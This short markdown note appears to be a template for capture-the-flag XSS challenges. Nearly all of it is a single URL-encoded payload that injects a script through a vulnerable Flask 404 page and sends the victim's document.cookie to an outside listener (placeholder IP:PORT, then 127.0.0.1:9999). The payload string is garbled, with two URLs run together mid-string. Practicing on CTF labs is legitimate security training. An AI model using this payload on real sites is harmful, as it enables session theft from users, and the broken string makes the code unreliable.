# Template for XSS CTF Challenges

The following payload can steal the bots cookie (flag) by triggering XSS on the vulnerable 404 flask method

```
http://127.0.0.1:1337/%3Cscript%3Edocument.write('%3Cimg%20src=%22http://IP:PORT/?cookie=%27%20+%20document.cookie%20+%20%27%22%20/%3E%27)%3C/script%3E0.1:1337/%3Cscript%3Edocument.write('%3Cimg%20src=%22http://127.0.0.1:9999/?cookie=%27%20+%20document.cookie%20+%20%27%22%20/%3E%27)%3C/script%3E
```
